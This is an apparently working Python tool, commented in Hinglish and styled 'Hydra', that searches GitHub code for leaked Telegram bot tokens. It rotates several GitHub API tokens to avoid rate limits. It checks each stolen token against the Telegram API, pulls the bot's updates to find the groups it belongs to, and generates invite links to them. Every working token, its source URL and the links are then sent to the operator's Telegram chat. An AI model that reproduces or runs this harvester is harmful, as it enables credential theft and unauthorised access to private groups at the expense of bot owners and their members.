import asyncio, aiohttp, re, base64, random
from telethon import TelegramClient
from aiolimiter import AsyncLimiter
from config import Config

# --- [ THE GLOBAL TARGET LIST ] ---
# Hazaron files scan karne ke liye extensions ka pool
EXTENSIONS = [
    'env', 'php', 'js', 'json', 'yml', 'yaml', 'sql', 'conf', 
    'ini', 'txt', 'log', 'sh', 'bak', 'old', 'dist', 'example'
]

# Keywords jo bot tokens ke aas paas hote hain
KEYWORDS = ['bot_token', 'telegram_token', 'tg_bot', 'api_key']

TOKEN_REGEX = r'[0-9]{10}:[a-zA-Z0-9_-]{35}'

client = TelegramClient('hydra_scan', Config.API_ID, Config.API_HASH).start(bot_token=Config.BOT_TOKEN)
limiter = AsyncLimiter(300, 1) # God Speed: 300 files per second

async def validate_and_report(token, source, file_type):
    """Token check aur report with file extension info"""
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(f"https://api.telegram.org/bot{token}/getMe") as r:
                if r.status == 200:
                    bot_info = (await r.json())['result']
                    user = bot_info['username']
                    
                    # Group Link Extraction Logic
                    links = []
                    async with session.get(f"https://api.telegram.org/bot{token}/getUpdates") as up:
                        u_data = await up.json()
                        if u_data.get("ok"):
                            for item in u_data["result"]:
                                chat = item.get("message", {}).get("chat", {})
                                if chat.get("type") in ["group", "supergroup"]:
                                    cid = chat["id"]
                                    async with session.get(f"https://api.telegram.org/bot{token}/exportChatInviteLink?chat_id={cid}") as inv:
                                        res = await inv.json()
                                        if res.get("ok"): links.append(f"🏰 {chat.get('title')}: {res['result']}")

                    msg = (f"🔱 **GLOBAL HYDRA HIT: {file_type.upper()}**\n\n"
                           f"👤 **Bot:** @{user}\n"
                           f"🔑 **Token:** `{token}`\n"
                           f"🔗 **Source:** {source}\n\n"
                           f"🔓 **Invite Links:**\n" + ("\n".join(links) if links else "None"))
                    await client.send_message(Config.LOG_CHAT, msg)
        except: pass

async def scan_deep(session, item, gh_token, ext):
    async with limiter:
        headers = {"Authorization": f"token {gh_token}"}
        try:
            # File content extraction
            async with session.get(item['url'], headers=headers) as r:
                data = await r.json()
                code = base64.b64decode(data['content']).decode('utf-8', errors='ignore')
                tokens = re.findall(TOKEN_REGEX, code)
                for t in set(tokens):
                    await validate_and_report(t, item['html_url'], ext)
        except: pass

async def start_hydra():
    print("💀 HYDRA MULTI-SCANNER ACTIVE. CONSUMING ALL EXTENSIONS...")
    async with aiohttp.ClientSession() as session:
        while True:
            # Extension aur Keyword ka combination banake scan karna
            ext = random.choice(EXTENSIONS)
            key = random.choice(KEYWORDS)
            dork = f'extension:{ext} "{key}"'
            
            gh_token = random.choice(Config.GH_TOKENS).strip()
            url = f"https://api.github.com/search/code?q={dork}&sort=indexed&order=desc"
            
            try:
                async with session.get(url, headers={"Authorization": f"token {gh_token}"}) as r:
                    if r.status == 200:
                        data = await r.json()
                        tasks = [scan_deep(session, item, gh_token, ext) for item in data.get('items', [])]
                        await asyncio.gather(*tasks)
                    elif r.status == 403: # Rate limited
                        await asyncio.sleep(10)
            except: pass
            await asyncio.sleep(1)

if __name__ == "__main__":
    with client:
        client.loop.run_until_complete(start_hydra())
